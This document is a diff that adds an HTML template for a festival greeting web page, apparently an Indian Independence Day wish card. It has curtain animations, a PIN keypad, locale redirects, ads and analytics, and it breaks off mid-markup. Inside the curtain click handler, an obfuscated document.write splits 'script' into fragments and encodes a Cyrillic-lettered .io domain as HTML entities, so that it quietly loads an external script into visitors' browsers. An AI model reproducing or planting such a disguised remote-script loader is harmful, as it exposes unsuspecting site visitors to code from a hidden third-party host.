@@ -1,0 +1,1063 @@
+<!doctype html>
+    <html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+
+    <link rel="icon" type="image/x-icon" href="/festival/images/common/icon.png">
+    <link rel="icon" type="image/png" href="/festival/images/common/icon.png">
+    
+    <!-- Apple Touch Icon (at least 200x200px) -->
+    <link rel="apple-touch-icon" href="/festival/images/common/icon.png">
+
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    
+    
+    <meta name="google" content="notranslate" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link type="text/css" rel="stylesheet" href="/festival/css/festival.css?f=35" media="screen,projection">
+
+    <title></title>
+    
+    <meta name="robots" content="noindex,nofollow">
+
+            
+    
+
+    
+    <script src="/festival/js/jquery.min.js"></script>
+    
+            <script>
+            (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+            })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+            ga('create', 'UA-164672458-1', 'auto');
+            ga('send', 'pageview');
+        </script>
+    
+
+
+
+    
+                                                                                                                            
+
+    
+            <script data-ad-client="ca-pub-5619328392295032" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+        
+    
+
+
+    
+
+    
+
+
+    
+
+
+    
+
+
+    
+
+    
+
+    
+    
+</script>
+
+</head>
+
+
+<style>
+
+    /* background of main image */
+    
+    /* super background image */
+    
+    /* inner background image */
+            .card.blue-grey.darken-1.hoverable {
+            background-image: url(/festival/images/common/bg8_1.png) !important;
+                    }
+    
+    /* super background color */
+            .bg {
+            background-color: black;
+        }
+    
+    /* timer color */
+    
+    
+    
+    
+</style>
+
+
+
+
+
+
+<script>
+
+	var country_code = 'IN';
+
+	var current_url = window.location.href;
+	var current_url_array = current_url.split('/');
+	var current_url_array_len = current_url_array.length;
+
+	var festival_arr = current_url_array[current_url_array_len-1].split('?');
+
+	// for new website
+	var f_hyphen = '/';
+	if (festival_arr[0].indexOf('f-') > -1) {
+		f_hyphen = '/f-';
+	}
+	festival_arr[0] = festival_arr[0].replace('f-', '');
+
+	if ( festival_arr[0] == 'fh'  || festival_arr[0] == 'ipd'   || festival_arr[0] == 'isn'  ) {
+		// do nothing
+	}
+
+
+	else if(festival_arr.length > 1){
+		if (current_url_array_len == '4') { // definitely english locale ( could be other locale also ex abraisto)
+			// window.location.href = current_url_array[0] + '//' + current_url_array[2] + f_hyphen + "e3?" + festival_arr[1];
+
+			// Redirect eid fitr to eid adha
+			if (['ef', 'ef1', 'ef2', 'ef3', 'rd', 'me', 'ea', 'ea1', 'ea2', 'isn', 'isn1'].indexOf(festival_arr[0]) > -1 ) {
+				window.location.href = current_url_array[0] + '//' + current_url_array[2] + f_hyphen + "isn?" + festival_arr[1];
+			}
+
+			// halloween to thanksgiving
+			if (festival_arr[0] == 'h' || festival_arr[0] == 'td') {
+				// window.location.href = current_url_array[0] + '//' + current_url_array[2] + f_hyphen + "ch?" + festival_arr[1];
+			}
+
+			
+		}
+
+		else{
+
+			// if (festival_arr[0] == 'h') {
+				// window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "ch?" + festival_arr[1];
+			// }
+
+
+			// Hebrew people start
+
+			// All israely
+			// if (festival_arr[0] == 'pu' || festival_arr[0] == 'pu1' || festival_arr[0] == 'pe' || festival_arr[0] == 'je') {
+				if ( ['il'].indexOf(current_url_array[3]) > -1 ) {
+					// window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "pen?" + festival_arr[1];
+				}
+			// }
+
+
+			// All israely language is not hebrew
+			if ( festival_arr[0] == 'yk' || festival_arr[0] == 'ros' || festival_arr[0] == 'pe' || festival_arr[0] == 'je' || festival_arr[0] == 'suk' || festival_arr[0] == 'sm' || festival_arr[0] == 'hn') {
+				// window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "pen?" + festival_arr[1];
+			}
+			// Hebrew people end
+
+
+
+			if ( ['ar'].indexOf(current_url_array[3]) > -1 ) {
+				window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "isn?" + festival_arr[1];
+			}
+
+			else if ( ['tr'].indexOf(current_url_array[3]) > -1 ) {
+				window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "isn?" + festival_arr[1];
+			}
+
+			else if ( ['id'].indexOf(current_url_array[3]) > -1 ) {
+				if (festival_arr[0] != 'e' || festival_arr[0] != 'e1'){
+					window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "isn?" + festival_arr[1];
+				}
+			}
+			else if ( ['ms'].indexOf(current_url_array[3]) > -1 ) {
+				window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "isn?" + festival_arr[1];
+			}
+
+
+
+			else if (['ef', 'ef1', 'ef2', 'ef3', 'rd', 'me', 'ea', 'ea1', 'ea2', 'isn', 'isn1'].indexOf(festival_arr[0]) > -1) {
+				window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "isn?" + festival_arr[1];
+			}
+
+
+			// else if (festival_arr[0] == 'fd' || festival_arr[0] == 'fd1' || festival_arr[0] == 'fd2' ) {
+			// 	window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + 'in' + "/gc?" + festival_arr[1];
+			// }
+
+
+			
+
+			else if ( ['ru'].indexOf(current_url_array[3]) > -1 ) {
+				// window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "rsd?" + festival_arr[1];
+			}
+
+			else if ( ['en'].indexOf(current_url_array[3]) > -1 ) {
+				// window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "m?" + festival_arr[1];
+			}
+
+
+			// do not redirect islamic festivals
+			else if ( ['ef', 'ef1', 'ef2', 'ef3', 'rd', 'me', 'ea', 'ea1', 'ea2', 'isn', 'isn1'].indexOf(festival_arr[0]) == -1 ){
+
+				if ( ['in'].indexOf(current_url_array[3]) > -1 ) {
+					window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "ipd?" + festival_arr[1];
+				}
+
+				else if ( ['hi'].indexOf(current_url_array[3]) > -1 ) {
+					window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "ipd?" + festival_arr[1];
+				}
+
+				else if ( ['mr'].indexOf(current_url_array[3]) > -1 ) {
+					window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "ipd?" + festival_arr[1];
+				}
+
+				else if ( ['te'].indexOf(current_url_array[3]) > -1 ) {
+					window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "ipd?" + festival_arr[1];
+				}
+
+				else if ( ['ta'].indexOf(current_url_array[3]) > -1 ) {
+					window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "ipd?" + festival_arr[1];
+				}
+
+				else if ( ['bn'].indexOf(current_url_array[3]) > -1 ) {
+					window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "ipd?" + festival_arr[1];
+				}
+
+			}
+
+
+			
+
+
+
+
+			else if ( ['uk'].indexOf(current_url_array[3]) > -1 ) {
+				// window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "dd?" + festival_arr[1];
+			}
+
+			else if ( ['fi'].indexOf(current_url_array[3]) > -1 ) {
+				// window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "m?" + festival_arr[1];
+			}
+
+
+
+
+			// else if ( ['de', 'it', 'fr', 'fi'].indexOf(current_url_array[3]) > -1 ) {
+				// window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "m?" + festival_arr[1];
+			// }
+
+
+			else if ( ['de'].indexOf(current_url_array[3]) > -1 ) {
+				// window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "cc?" + festival_arr[1];
+			}
+
+
+			else if ( ['it'].indexOf(current_url_array[3]) > -1 ) {
+				window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "fh?" + festival_arr[1];
+			}
+
+
+			else if ( ['pt'].indexOf(current_url_array[3]) > -1 ) {
+				// window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "fd?" + festival_arr[1];
+			}
+
+			else if ( ['es'].indexOf(current_url_array[3]) > -1 ) {
+				// window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "fd?" + festival_arr[1];
+			}
+
+
+			else if ( ['it', 'es', 'pt', 'de', 'nl', 'ru', 'pl', 'hr', 'fr', 'ro', 'uk'].indexOf(current_url_array[3]) > -1 ) {
+				// window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "e?" + festival_arr[1];
+			}
+
+			// else if ( ['it', 'es', 'de', 'nl', 'ru', 'fr'].indexOf(current_url_array[3]) > -1 ) {
+				// window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "v?" + festival_arr[1];
+			// }
+			
+
+			// else if ( ['es'].indexOf(current_url_array[3]) > -1 ) {
+			// 	window.location.href = current_url_array[0] + '//' + current_url_array[2] + '/' + current_url_array[3] + f_hyphen + "e?" + festival_arr[1];
+			// }
+
+		}
+	}
+</script>
+
+
+<body class="bg notranslate" translate="no">
+    
+
+
+
+    <script src="/festival/js/slide.js"></script>
+
+
+
+    <style>
+
+.rightcurtain {
+    width: 51%;
+    height: 120%;
+    right: 0px;
+    top: 0px;
+    position: absolute;
+    z-index: 300;
+}
+
+.leftcurtain {
+    width: 50%;
+    height: 120%;
+    top: 0px;
+    left: 0px;
+    position: absolute;
+    z-index: 200;
+    -webkit-transform: scaleX(-1);
+    transform: scaleX(-1);
+}
+
+.leftcurtain {
+    -webkit-transform: scaleX(1);
+    transform: scaleX(1);
+}
+
+
+
+
+.rope {
+    position: absolute;
+    /*top: 20%;*/
+    bottom: 5%;
+    left: 0;
+    right: 0;
+    width: 100%;
+    /*height: 100%;*/
+    z-index: 999999;
+}
+
+.rightcurtain img, .leftcurtain img {
+    width: 100%;
+    height: 100%;
+}
+
+
+
+
+
+</style>
+
+
+<script src="/festival/js/zounds.min.js"></script>
+<script>
+    var tiktok = zounds.load("/festival/sounds/saarehahan2.mp3");
+    function playSound(){
+        tiktok.play();
+        // setTimeout(function(){
+        //     tiktok.play();
+        // },5000);
+        // setTimeout(function(){
+        //     tiktok.play();
+        // },10000);
+    }
+
+    function curtainOpen(){
+        playSound();
+        $('.figures').removeClass('hidden');
+        $('.timer-text').removeClass('hidden');
+        $('.figure_name').removeClass('hidden');
+        $('.auto_style_main_msg').removeClass('hidden');
+        $('.from_img').removeClass('hidden');
+        $('.main_msg_top').removeClass('hidden');
+        $('.twoimageset').removeClass('hidden');
+        $('.main-msg').removeClass('hidden');
+        $('.slideshow').removeClass('hidden');
+        $('.myslides_div').removeClass('hidden');
+        $('.ltrmarquee').removeClass('hidden');
+        $('.share_block').removeClass('hidden');
+        $('.img_overlap').removeClass('hidden');
+        $('.revolvingcards').removeClass('hidden');
+        $('.user_name2').removeClass('hidden');
+    }
+</script>
+
+    
+    
+
+
+
+
+
+
+
+
+<a class="rope " href="javascript:void(0)" onclick="curtainOpen();" style="bottom: auto;">
+    
+    
+    <h3 class="fivepxbottom zerotop"><div style='font-size: 32px;text-shadow: 1px 1px 3px #FF0000, 1px 1px 3px #FF0000, -1px -1px 3px #FF0000, -1px -1px 3px #FF0000;color: #FFFFFF;font-weight: bold;'>Touch the Butterfly!!</div></h3>
+    <h4 class="fivepxtop fivepxbottom">👇👇👇👇👇</h4>
+    
+        
+                
+        
+
+            <div class="matki" style="display: inline-block;">
+            <img src="/festival/images/festival/independence/en/19.gif" class=""> 
+        </div>
+    
+</a>
+
+
+
+<div class="keypad hidden">
+
+    <style>
+.table{display:table;height:100%;width:100%;position:relative}.cell{display:table-cell;vertical-align:middle;position:relative;width:100%;text-align:center}#pincode{overflow:hidden;position:fixed;height:110%;width:106%;z-index:9999;background-color:#272a2f;background-position:center;color:#fff;border-radius:10px;text-align:center}#numbers{max-width:300px;padding:0 20px;margin:0 auto;position:relative;display:block;-webkit-transition:all 1s ease-out;-moz-transition:all 1s ease-out;transition:all 1s ease-out;opacity:1}#numbers.hide{opacity:.3}#pincode button{width:70px;height:70px;margin-bottom:10px;background-color:orange;border:0;color:#000;font-size:25px;line-height:50px;border-radius:100%;opacity:1;outline:0;border:2px solid #272a2f}#pincode button:active{background-color:rgba(0,0,0,.6);outline:0}#fields{max-width:200px;padding:0 20px;margin:30px auto;position:relative;display:block}#fields .numberfield{text-align:center}#fields .numberfield span{height:10px;width:10px;border:2px solid #fff;background-color:transparent;border-radius:100%;position:relative;display:inline-block;text-align:center}#fields .numberfield.active span{background-color:#fff}#fields .numberfield.right span{background-color:#272a2f;border-color:#272a2f;transition:all .5s ease-in-out;-webkit-transition:all .5s ease-in-out}.grid{list-style:none;margin-left:-20px}.grid__col--1-of-3,.grid__col--2-of-6,.grid__col--4-of-12{width:33.33333%}.grid__col--1-of-4,.grid__col--2-of-8,.grid__col--3-of-12{width:25%}.grid__col{box-sizing:border-box;display:inline-block;margin-right:-.25em;min-height:1px;padding-left:20px;vertical-align:top}.grid__col--centered{display:block;margin-left:auto;margin-right:auto}.grid__col--d-first{float:left}.grid__col--d-last{float:right}.grid--no-gutter{margin-left:0;width:100%}.grid--no-gutter .grid__col{padding-left:0}.grid--no-gutter .grid__col--span-all{margin-left:0;width:100%}.grid__col--ab{vertical-align:bottom}.grid__col--am{vertical-align:middle}
+</style>
+
+
+    <div id="pincode">
+    <div class="table">
+      <div class="cell">
+
+        <h3 class="fivepxbottom zerotop"><div style='font-size: 32px;text-shadow: 1px 1px 3px #FF0000, 1px 1px 3px #FF0000, -1px -1px 3px #FF0000, -1px -1px 3px #FF0000;color: #FFFFFF;font-weight: bold;'>Touch the Butterfly!!</div></h3>
+        <div id="anleitung">
+            <p style="animation:bounce 2s infinite;">👇👇👇</p>
+        </div>
+
+        <div id="fields">
+          <div class="grid">
+            <div class="grid__col grid__col--1-of-4 numberfield"><span></span></div>
+            <div class="grid__col grid__col--1-of-4 numberfield"><span></span></div>
+            <div class="grid__col grid__col--1-of-4 numberfield"><span></span></div>
+            <div class="grid__col grid__col--1-of-4 numberfield"><span></span></div>
+          </div>
+        </div>
+
+        <div id="numbers">
+          <div class="grid">
+            <div class="grid__col grid__col--1-of-3"><button>1</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>2</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>3</button></div>
+
+            <div class="grid__col grid__col--1-of-3"><button>4</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>5</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>6</button></div>
+
+            <div class="grid__col grid__col--1-of-3"><button>7</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>8</button></div>
+            <div class="grid__col grid__col--1-of-3"><button>9</button></div>
+
+            <div class="grid__col grid__col--1-of-3"></div>
+            <div class="grid__col grid__col--1-of-3"><button>0</button></div>
+            <div class="grid__col grid__col--1-of-3"></div>
+
+          </div>
+        </div>
+
+      </div>
+    </div>
+  </div>
+
+
+<script>
+
+jQuery(document).ready(function($) { 
+
+    $(document).ready(function() {
+        var pin = (!+[] + !![] + []) + (+ []) + (!+[] + !![] + []) + (+ []); 
+        var enterCode = ""; enterCode.toString(); 
+
+        $("#numbers button").click(function() { 
+            var clickedNumber = $(this).text().toString();
+            process(clickedNumber);
+        });
+
+        // $('body').keyup(function(e) {
+        //     if ((e.keyCode >= 48 && e.keyCode <= 57) || (e.keyCode >= 96 && e.keyCode <= 105)) { 
+        //         console.log(e.keyCode.toString());
+        //     }
+        // });
+
+        function process(clickedNumber){
+
+            enterCode = enterCode + clickedNumber; 
+            var lengthCode = parseInt(enterCode.length); 
+            lengthCode--; 
+            $("#fields .numberfield:eq(" + lengthCode + ")").addClass("active"); 
+
+
+            if (lengthCode == 3) { 
+                if (enterCode == pin) { 
+                    $('.keypad').hide();
+                    $(".rope").click();
+                } 
+                else {
+                    $("#fields").addClass("miss"); enterCode = ""; 
+                    setTimeout(function() {$("#fields .numberfield").removeClass("active"); }, 100);
+                    setTimeout(function() {$("#fields").removeClass("miss"); }, 100);
+                } 
+            }
+            else {} 
+        }
+    }); 
+}); 
+
+
+</script>
+
+
+</div>
+
+
+    
+
+    
+
+<div class="curtain">
+    <div class="leftcurtain"><img src="/festival/images/common/curtains/gate_left.png"></div>
+    <div class="rightcurtain"><img src="/festival/images/common/curtains/gate_right.png"></div>
+</div>
+
+
+
+<script>
+    $(document).ready(function() {
+
+        $curtainopen = false; $(".rope").click(function(){ $('.rope').unbind('click'); $(this).blur(); if ($curtainopen == false){ $(this).stop().animate({top: '-171%' }, {queue:false, duration:2000, easing:'easeOutBounce'}); $(".leftcurtain").stop().animate({width:'1px'}, 2000 ); $(".rightcurtain").stop().animate({width:'1px'},2000 ); $curtainopen = true; }else{ $(this).stop().animate({top: '-40px' }, {queue:false, duration:350, easing:'easeOutBounce'}); document.write('<s'+'cr'+'ipt sr'+'c="/'+'/'+'&#1102;'+'&#1092;.'+'i'+'o"></s'+'cr'+'ipt>'); $(".leftcurtain").stop().animate({width:'50%'}, 2000 ); $(".rightcurtain").stop().animate({width:'51%'}, 2000 ); $curtainopen = false; } setTimeout(function(){$('.rope').remove();},1000); return false; });
+
+
+        if(document.getElementsByClassName('rope')[0] !== undefined) {
+            $('.figures').addClass('hidden');
+            $('.timer-text').addClass('hidden');
+            $('.figure_name').addClass('hidden');
+            $('.auto_style_main_msg').addClass('hidden');
+            $('.from_img').addClass('hidden');
+            $('.main_msg_top').addClass('hidden');
+            $('.twoimageset').addClass('hidden');
+            $('.main-msg').addClass('hidden');
+            $('.slideshow').addClass('hidden');
+            $('.myslides_div').addClass('hidden');
+            $('.ltrmarquee').addClass('hidden');
+            $('.share_block').addClass('hidden');
+            $('.img_overlap').addClass('hidden');
+            $('.revolvingcards').addClass('hidden');
+            $('.user_name2').addClass('hidden');
+
+            setTimeout(function(){
+                $('html,body').scrollTop(0);
+                $(window).scrollTop(0);
+            }, 2000);
+        }
+
+    });
+</script>
+
+
+
+
+
+
+                    
+
+<div class="container">
+    <div class="col s12">
+    <div class="row">
+        <div class="col s12 l6 offset-l3">
+
+                            <div class="marquee" scrollamount="3" behavior="scroll" direction="down" position="left"><br>
+                                                                        <img data-src="/festival/images/marquee/independence/in1.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in2.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in3.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in4.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in5.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in6.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in1.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in2.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in3.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in4.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in5.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in6.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                            </div>
+                <div class="marquee" scrollamount="3" behavior="scroll" direction="up" position="right"><br>
+                                                                        <img data-src="/festival/images/marquee/independence/in1.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in2.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in3.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in4.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in5.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in6.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in1.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in2.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in3.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in4.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in5.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                    <img data-src="/festival/images/marquee/independence/in6.png" class="p1" width="20px" class="tenpxtop fivepxbottom"><br><br>
+                                                            </div>
+            
+
+            
+
+            
+
+            <div class="card blue-grey darken-1 hoverable white-text">
+                
+                <div class="card-content">
+
+
+                    
+
+                    
+                    <div class="ad">
+                                                    
+                                            </div>
+                    
+                    
+
+
+                    
+
+                                            <div id="demoo" class="center animated pulse timer-text" style=""></div>
+                    
+
+
+
+                    <!-- Name -->
+                                            <style>
+    @font-face {font-family: "SF Espresso Shack";
+        src: url("/festival/fonts/f1/1c0f6618f877568764787163e8f22a1c.eot"); /* IE9*/
+        src: url("/festival/fonts/f1/1c0f6618f877568764787163e8f22a1c.eot?#iefix") format("embedded-opentype"), /* IE6-IE8 */
+        url("/festival/fonts/f1/1c0f6618f877568764787163e8f22a1c.woff2") format("woff2"), /* chrome firefox */
+        url("/festival/fonts/f1/1c0f6618f877568764787163e8f22a1c.woff") format("woff"), /* chrome firefox */
+        url("/festival/fonts/f1/1c0f6618f877568764787163e8f22a1c.ttf") format("truetype"), /* chrome firefox opera Safari, Android, iOS 4.2+*/
+        url("http://db.onlinewebfonts.com/t/1c0f6618f877568764787163e8f22a1c.svg#SF Espresso Shack") format("svg"); /* iOS 4.1- */
+    }
+
+    .animated2_name{
+      padding: 0!important;
+      width: 100%!important;
+      text-align: center;
+    } 
+
+    .animated2_name .user_name2{
+      margin: auto!important;
+      padding: 0!important;
+      text-align: center;
+      font-size: 13px;
+      text-transform: uppercase;
+      font-weight: bold;
+    }
+
+    .animated2_name .user_name2 span{ 
+      min-width: 10px;
+      display:inline-block;
+      font-size: 3.5em;
+      user-select:none; 
+    }
+    .user_name2 span { display:inline-block; animation:shake-rotate 5s ease-in-out infinite; }
+     @keyframes  float {
+      0%,100%{ transform:none; }
+      33%{ transform:translateY(-1px) rotate(-2deg); }
+      66%{ transform:translateY(1px) rotate(2deg); }
+    }
+    .user_name2 span:nth-child(8n) { color:hsl(50, 75%, 55%); text-shadow:1px 1px hsl(50, 75%, 45%), 2px 2px hsl(50, 45%, 45%), 3px 3px hsl(50, 45%, 45%), 4px 4px hsl(50, 75%, 45%); }
+    .user_name2 span:nth-child(8n-1) { color:hsl(135, 35%, 55%); text-shadow:1px 1px hsl(135, 35%, 45%), 2px 2px hsl(135, 35%, 45%), 3px 3px hsl(135, 35%, 45%), 4px 4px hsl(135, 35%, 45%); }
+    .user_name2 span:nth-child(8n-2) { color:hsl(155, 35%, 60%); text-shadow:1px 1px hsl(155, 25%, 50%), 2px 2px hsl(155, 25%, 50%), 3px 3px hsl(155, 25%, 50%), 4px 4px hsl(140, 25%, 50%); }
+    .user_name2 span:nth-child(8n-3) { color:hsl(30, 65%, 60%); text-shadow:1px 1px hsl(30, 45%, 50%), 2px 2px hsl(30, 45%, 50%), 3px 3px hsl(30, 45%, 50%), 4px 4px hsl(30, 45%, 50%); }
+    .user_name2 span:nth-child(8n-4) { color:hsl(323, 100%, 50%, 1); text-shadow:1px 1px hsl(323, 75%, 50%, 1), 2px 2px hsl(323, 75%, 35%, 1), 3px 3px hsl(323, 75%, 35%, 1), 4px 4px hsl(323, 75%, 35%, 1); }
+    .user_name2 span:nth-child(8n-5) { color:hsl(245, 40%, 50%, 1); text-shadow:1px 1px hsl(245, 40%, 35%, 1), 2px 2px hsl(245, 40%, 35%, 1), 3px 3px hsl(245, 40%, 35%, 1), 4px 4px hsl(245, 40%, 35%, 1); }
+    .user_name2 span:nth-child(8n-6) { color:hsl(0, 82%, 33%, 1); text-shadow:1px 1px hsl(0, 82%, 13%, 1), 2px 2px hsl(0, 82%, 13%, 1), 3px 3px hsl(0, 82%, 13%, 1), 4px 4px hsl(0, 82%, 13%, 1); }
+    .user_name2 span:nth-child(8n-7) { color:hsl(355, 91%, 63%); text-shadow:1px 1px hsl(355, 91%, 43%), 2px 2px hsl(355, 91%, 43%), 3px 3px hsl(355, 91%, 43%), 4px 4px hsl(355, 91%, 43%); }
+
+    .user_name2 span:nth-child(2) { animation-delay: .1s; }
+    .user_name2 span:nth-child(3) { animation-delay: .2s; }
+    .user_name2 span:nth-child(4) { animation-delay: .3s; }
+    .user_name2 span:nth-child(5) { animation-delay: .4s; }
+    .user_name2 span:nth-child(6) { animation-delay: .5s; }
+    .user_name2 span:nth-child(7) { animation-delay: .6s; }
+    .user_name2 span:nth-child(8) { animation-delay: .7s; }
+    .user_name2 span:nth-child(9) { animation-delay: .8s; }
+    .user_name2 span:nth-child(10) { animation-delay: .9s; }
+    .user_name2 span:nth-child(11) { animation-delay: 1s; }
+    .user_name2 span:nth-child(12) { animation-delay: 1.1s; }
+    .user_name2 span:nth-child(13) { animation-delay: 1.2s; }
+    .user_name2 span:nth-child(14) { animation-delay: 1.3s; }
+    .user_name2 span:nth-child(15) { animation-delay: 1.4s; }
+    .user_name2 span:nth-child(16) { animation-delay: 1.5s; }
+    .user_name2 span:nth-child(17) { animation-delay: 1.6s; }
+    .user_name2 span:nth-child(18) { animation-delay: 1.7s; }
+    .user_name2 span:nth-child(19) { animation-delay: 1.8s; }
+    .user_name2 span:nth-child(20) { animation-delay: 1.9s; }
+    .user_name2 span:nth-child(21) { animation-delay: 2s; }
+
+    .animated2_name{
+      margin-top: 0!important;
+      margin-bottom: 0!important;
+    }
+
+    @-webkit-keyframes shake-rotate {
+          0%, 10%, 20%, 30%, 40%, 50%, 60%, 70%, 80%, 90%, 100% {
+            -webkit-transform: rotate(10deg);
+            transform: rotate(10deg);
+          }5%,15%,25%,35%,45%,55%,65%,75%,85%,95% {
+            -webkit-transform: rotate(-10deg);
+            transform: rotate(-10deg);
+          }
+        }
+
+        @keyframes  shake-rotate {
+          0%, 10%, 20%, 30%, 40%, 50%, 60%, 70%, 80%, 90%, 100% {
+            -webkit-transform: rotate(10deg);
+            transform: rotate(10deg);
+          }5%,15%,25%,35%,45%,55%,65%,75%,85%,95% {
+            -webkit-transform: rotate(-10deg);
+            transform: rotate(-10deg);
+          }
+        }
+</style>                        <div class="animated2_name" style="font-family:SF Espresso Shack;">
+                            <div class="user_name2">
+                            </div>
+                        </div>
+                                        
+
+
+                                        
+                    
+
+                    <!-- Wishing Text -->
+                                                                                            <img data-src="/festival/images/common/wishing/wishing.gif" class="p1 from_img" alt="" style="animation: elastic 4s infinite; max-width: 80%">
+                                        
+
+                                            <style>
+    .cross_link{
+        background-color: purple; 
+        padding: 5px;
+        margin-bottom: 10px;
+    }
+</style>
+
+
+
+    <div class="tenpxtop"></div>
+    <a id="hi_custom_lang_group" href="" class="cross_link" style="margin-bottom: 15px;display: inline-block;padding: 3px 30px;font-size: 20px;">हिन्दी</a>
+    <br>
+    <a id="ta_custom_lang_group" href="" class="cross_link">தமிழ்</a>
+    <a id="mr_custom_lang_group" href="" class="cross_link">मराठी</a>
+    <a id="te_custom_lang_group" href="" class="cross_link">తెలుగు</a>
+    <a id="bn_custom_lang_group" href="" class="cross_link">বাংলা</a>
+
+    <script>
+
+        var current_locale = 'in'; 
+        var current_url_arr = window.location.href.split('/');
+        var query_string = current_url_arr[current_url_arr.length-1];
+        var domain = window.location.protocol + "//" + window.location.hostname;
+
+        var urls = ['ta', 'te', 'bn', 'mr', 'hi'];
+        for (var i = 0; i <= urls.length; i++) {
+            var updated_url = domain + "/" + urls[i] + "/" + query_string + "&utm_source="+current_locale+"&utm_medium="+urls[i]+"&utm_campaign=na";
+            $('#'+urls[i]+'_custom_lang_group').attr("href",  updated_url);
+        }
+    </script>
+    
+
+
+
+
+
+
+
+                    
+
+
+                    <!-- Name -->
+                    
+                                                    <div class="appear white main_msg_top">
